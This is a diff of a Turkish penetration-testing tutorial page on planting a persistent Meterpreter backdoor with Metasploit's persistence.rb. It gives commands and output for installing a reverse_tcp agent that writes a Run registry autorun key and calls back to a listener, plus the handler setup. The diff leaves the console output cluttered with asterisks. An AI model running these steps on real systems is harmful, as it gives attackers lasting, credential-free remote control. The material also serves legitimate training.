@@ -31,70 +31,70 @@ url: /tr/msf-meterpreter-kalici-backdoor/
 <h1 class="wp-block-heading" id="persistencerb">Persistence.rb 
 <!-- /wp:heading -->
 
-  Hedef sistemde oturum açtıktan sonra kalıcılık sağlamak için Metasploit Framework içinde kullanabileceğiniz bir diğer yöntem de&nbsp;<code>persistence.rb</code>&nbsp;script kodunu kullanmaktır.</p>
+  Hedef sistemde oturum açtıktan sonra kalıcılık sağlamak için Metasploit Framework içinde kullanabileceğiniz bir diğer yöntem de&nbsp;<code>persistence.rb</code>&nbsp;script kodunu kullanmaktır.
  
 
-  Bu yöntem sayesinde, hedef bilgisayar güncellense bile tekrar bağlanma imkanınız bulunmaktadır. Ayrıca, hedef sistemin tekrar başlatılması da bağlantı yapmayı etkilemeyecektir.</p>
+  Bu yöntem sayesinde, hedef bilgisayar güncellense bile tekrar bağlanma imkanınız bulunmaktadır. Ayrıca, hedef sistemin tekrar başlatılması da bağlantı yapmayı etkilemeyecektir.
  
 
-  Bir önceki konuda,&nbsp;<code>metsvc</code>&nbsp;için yaptığımız uyarıyı burada da tekrarlayalım.&nbsp;<code>persistence.rb</code>&nbsp;arka kapısı, bağlantı için herhangi bir oturum bilgisi kullanmaz. Bu açıklığı keşfeden herkes bağlantı sağlayabilir.</p>
+  Bir önceki konuda,&nbsp;<code>metsvc</code>&nbsp;için yaptığımız uyarıyı burada da tekrarlayalım.&nbsp;<code>persistence.rb</code>&nbsp;arka kapısı, bağlantı için herhangi bir oturum bilgisi kullanmaz. Bu açıklığı keşfeden herkes bağlantı sağlayabilir.
  
 
-  Hedef sistemde meterpreter oturum açtıktan sonra&nbsp;<code>persistence.rb</code>&nbsp;script kodunu kullanmadan önce yardım bilgilerini görüntüleyelim ve bize hangi imkanları sağladığını görelim.</p>
+  Hedef sistemde meterpreter oturum açtıktan sonra&nbsp;<code>persistence.rb</code>&nbsp;script kodunu kullanmadan önce yardım bilgilerini görüntüleyelim ve bize hangi imkanları sağladığını görelim.
  
 
 <!-- wp:code -->
-<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter <strong>&gt;</strong> run persistence -h
+<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter ***&gt;***  run persistence -h
 
-<strong>[!]</strong> Meterpreter scripts are deprecated. Try post/windows/manage/persistence_exe.
-<strong>[!]</strong> Example: run post/windows/manage/persistence_exe OPTION<strong>=</strong>value <strong>[</strong>...]
-Meterpreter Script <strong>for </strong>creating a persistent backdoor on a target host.
+***[!]***  Meterpreter scripts are deprecated. Try post/windows/manage/persistence_exe.
+***[!]***  Example: run post/windows/manage/persistence_exe OPTION***=*** value ***[*** ...]
+Meterpreter Script ***for *** creating a persistent backdoor on a target host.
 
 OPTIONS:
 
     -A   Automatically start a matching exploit/multi/handler to connect to the agent
-    -L   Location <strong>in </strong>target host to write payload to, <strong>if </strong>none %TEMP% will be used.
+    -L   Location ***in *** target host to write payload to, ***if *** none %TEMP% will be used.
     -P   Payload to use, default is windows/meterpreter/reverse_tcp.
-    -S   Automatically start the agent on boot as a service <strong>(</strong>with SYSTEM privileges<strong>)</strong>
+    -S   Automatically start the agent on boot as a service ***(*** with SYSTEM privileges***)*** 
     -T   Alternate executable template to use
     -U   Automatically start the agent when the User logs on
     -X   Automatically start the agent when the system boots
     -h   This help menu
-    -i   The interval <strong>in </strong>seconds between each connection attempt
+    -i   The interval ***in *** seconds between each connection attempt
     -p   The port on which the system running Metasploit is listening
-    -r   The IP of the system running Metasploit listening <strong>for </strong>the connect back
+    -r   The IP of the system running Metasploit listening ***for *** the connect back
 </code></pre>
 <!-- /wp:code -->
 
-  Aşağıdaki&nbsp;<code>persistence -U -i 5 -p 443 -r 192.168.1.71</code>&nbsp;komutu hangi işlemleri yapıyor?</p>
+  Aşağıdaki&nbsp;<code>persistence -U -i 5 -p 443 -r 192.168.1.71</code>&nbsp;komutu hangi işlemleri yapıyor?
  
 
-  <code>-U</code>, bir kullanıcı oturum açtığında bizim bilgisayarımıza otomatik bağlantı yapılmasını sağlar.</p>
+  <code>-U</code>, bir kullanıcı oturum açtığında bizim bilgisayarımıza otomatik bağlantı yapılmasını sağlar.
  
 
-  <code>-i 5</code>&nbsp;Karşe taraftaki&nbsp;<code>persistence.rb</code>&nbsp;script kodu her 5 saniyede bir bize bağlanmaya çalışır.</p>
+  <code>-i 5</code>&nbsp;Karşe taraftaki&nbsp;<code>persistence.rb</code>&nbsp;script kodu her 5 saniyede bir bize bağlanmaya çalışır.
  
 
-  <code>-p 443</code>&nbsp;bizim dinleme yapan bilgisayarımızın dinleme yaptığı port numarasıdır.</p>
+  <code>-p 443</code>&nbsp;bizim dinleme yapan bilgisayarımızın dinleme yaptığı port numarasıdır.
  
 
-  <code>-r 192.168.1.71</code>&nbsp;bizim dinleme yapan bilgisayarımızın IP numarasıdır.</p>
+  <code>-r 192.168.1.71</code>&nbsp;bizim dinleme yapan bilgisayarımızın IP numarasıdır.
  
 
 <!-- wp:code -->
-<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter <strong>&gt;</strong> run persistence -U -i 5 -p 443 -r 192.168.1.71
-<strong>[</strong><strong>*</strong><strong>]</strong> Creating a persistent agent: LHOST<strong>=</strong>192.168.1.71 LPORT<strong>=</strong>443 <strong>(</strong>interval<strong>=</strong>5 onboot<strong>=</strong>true<strong>)</strong>
-<strong>[</strong><strong>*</strong><strong>]</strong> Persistent agent script is 613976 bytes long
-<strong>[</strong><strong>*</strong><strong>]</strong> Uploaded the persistent agent to C:\WINDOWS\TEMP\yyPSPPEn.vbs
-<strong>[</strong><strong>*</strong><strong>]</strong> Agent executed with PID 492
-<strong>[</strong><strong>*</strong><strong>]</strong> Installing into autorun as HKCU\Software\Microsoft\Windows\CurrentVersion\Run\YeYHdlEDygViABr
-<strong>[</strong><strong>*</strong><strong>]</strong> Installed into autorun as HKCU\Software\Microsoft\Windows\CurrentVersion\Run\YeYHdlEDygViABr
-<strong>[</strong><strong>*</strong><strong>]</strong> For cleanup use command: run multi_console_command -rc /root/.msf4/logs/persistence/XEN-XP-SP2-BARE_20100821.2602/clean_up__20100821.2602.rc
-meterpreter <strong>&gt;</strong>
+<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter ***&gt;***  run persistence -U -i 5 -p 443 -r 192.168.1.71
+***[*** ******* ***]***  Creating a persistent agent: LHOST***=*** 192.168.1.71 LPORT***=*** 443 ***(*** interval***=*** 5 onboot***=*** true***)*** 
+***[*** ******* ***]***  Persistent agent script is 613976 bytes long
+***[*** ******* ***]***  Uploaded the persistent agent to C:\WINDOWS\TEMP\yyPSPPEn.vbs
+***[*** ******* ***]***  Agent executed with PID 492
+***[*** ******* ***]***  Installing into autorun as HKCU\Software\Microsoft\Windows\CurrentVersion\Run\YeYHdlEDygViABr
+***[*** ******* ***]***  Installed into autorun as HKCU\Software\Microsoft\Windows\CurrentVersion\Run\YeYHdlEDygViABr
+***[*** ******* ***]***  For cleanup use command: run multi_console_command -rc /root/.msf4/logs/persistence/XEN-XP-SP2-BARE_20100821.2602/clean_up__20100821.2602.rc
+meterpreter ***&gt;*** 
 </code></pre>
 <!-- /wp:code -->
 
-  Verdiğimiz komut sonucunda başlatılan script, çıktılarda da görüleceği gibi işimiz tamamlandığında log temizleme işleminin nasıl yapılabileceğini de gösteriyor.</p>
+  Verdiğimiz komut sonucunda başlatılan script, çıktılarda da görüleceği gibi işimiz tamamlandığında log temizleme işleminin nasıl yapılabileceğini de gösteriyor.
  
 
 <!-- wp:code -->
@@ -102,47 +102,47 @@ meterpreter <strong>&gt;</strong>
 </code></pre>
 <!-- /wp:code -->
 
-  Scriptin çalışıp çalışmadığını ve otomatik bağlantı yapıp yapmadığını, hedef bilgisayarı tekrar başlatarak anlayabiliriz. Hedef bilgisayarı yeniden başlatalım.</p>
+  Scriptin çalışıp çalışmadığını ve otomatik bağlantı yapıp yapmadığını, hedef bilgisayarı tekrar başlatarak anlayabiliriz. Hedef bilgisayarı yeniden başlatalım.
  
 
 <!-- wp:code -->
-<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter <strong>&gt;</strong> reboot
+<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter ***&gt;***  reboot
 Rebooting...
-meterpreter <strong>&gt;</strong> exit
+meterpreter ***&gt;***  exit
 
-<strong>[</strong><strong>*</strong><strong>]</strong> Meterpreter session 3 closed.  Reason: User exit
+***[*** ******* ***]***  Meterpreter session 3 closed.  Reason: User exit
 </code></pre>
 <!-- /wp:code -->
 
-  Dinleyici&nbsp;<code>exploit/multi/handler</code>&nbsp;modülünü tekrar başlatalım.</p>
+  Dinleyici&nbsp;<code>exploit/multi/handler</code>&nbsp;modülünü tekrar başlatalım.
  
 
 <!-- wp:code -->
-<pre class="wp-block-code"><code lang="bash" class="language-bash">msf exploit<strong>(</strong>ms08_067_netapi<strong>)</strong> <strong>&gt;</strong> use exploit/multi/handler
-msf exploit<strong>(</strong>handler<strong>)</strong> <strong>&gt;</strong> set PAYLOAD windows/meterpreter/reverse_tcp
-PAYLOAD <strong>=&gt;</strong> windows/meterpreter/reverse_tcp
-msf exploit<strong>(</strong>handler<strong>)</strong> <strong>&gt;</strong> set LHOST 192.168.1.71
-LHOST <strong>=&gt;</strong> 192.168.1.71
-msf exploit<strong>(</strong>handler<strong>)</strong> <strong>&gt;</strong> set LPORT 443
-LPORT <strong>=&gt;</strong> 443
-msf exploit<strong>(</strong>handler<strong>)</strong> <strong>&gt;</strong> exploit
+<pre class="wp-block-code"><code lang="bash" class="language-bash">msf exploit***(*** ms08_067_netapi***)***  ***&gt;***  use exploit/multi/handler
+msf exploit***(*** handler***)***  ***&gt;***  set PAYLOAD windows/meterpreter/reverse_tcp
+PAYLOAD ***=&gt;***  windows/meterpreter/reverse_tcp
+msf exploit***(*** handler***)***  ***&gt;***  set LHOST 192.168.1.71
+LHOST ***=&gt;***  192.168.1.71
+msf exploit***(*** handler***)***  ***&gt;***  set LPORT 443
+LPORT ***=&gt;***  443
+msf exploit***(*** handler***)***  ***&gt;***  exploit
 
-<strong>[</strong><strong>*</strong><strong>]</strong> Started reverse handler on 192.168.1.71:443
-<strong>[</strong><strong>*</strong><strong>]</strong> Starting the payload handler...
+***[*** ******* ***]***  Started reverse handler on 192.168.1.71:443
+***[*** ******* ***]***  Starting the payload handler...
 </code></pre>
 <!-- /wp:code -->
 
-  Hedef bilgisayar tekrar başladığında, oturum açılır açılmaz yerel bilgisayara bağlantı, aşağıda görüldüğü gibi tekrar sağlanacaktır.</p>
+  Hedef bilgisayar tekrar başladığında, oturum açılır açılmaz yerel bilgisayara bağlantı, aşağıda görüldüğü gibi tekrar sağlanacaktır.
  
 
 <!-- wp:code -->
-<pre class="wp-block-code"><code lang="bash" class="language-bash"><strong>[</strong><strong>*</strong><strong>]</strong> Sending stage <strong>(</strong>748544 bytes<strong>)</strong> to 192.168.1.161
-<strong>[</strong><strong>*</strong><strong>]</strong> Meterpreter session 5 opened <strong>(</strong>192.168.1.71:443 -&gt; 192.168.1.161:1045<strong>)</strong> at 2010-08-21 12:31:42 -0600
+<pre class="wp-block-code"><code lang="bash" class="language-bash">***[*** ******* ***]***  Sending stage ***(*** 748544 bytes***)***  to 192.168.1.161
+***[*** ******* ***]***  Meterpreter session 5 opened ***(*** 192.168.1.71:443 -&gt; 192.168.1.161:1045***)***  at 2010-08-21 12:31:42 -0600
 
-meterpreter <strong>&gt;</strong> sysinfo
+meterpreter ***&gt;***  sysinfo
 Computer: XEN-XP-SP2-BARE
-OS      : Windows XP <strong>(</strong>Build 2600, Service Pack 2<strong>)</strong>.
+OS      : Windows XP ***(*** Build 2600, Service Pack 2***)*** .
 Arch    : x86
 Language: en_US
-meterpreter <strong>&gt;</strong></code></pre>
+meterpreter ***&gt;*** </code></pre>
 <!-- /wp:code -->
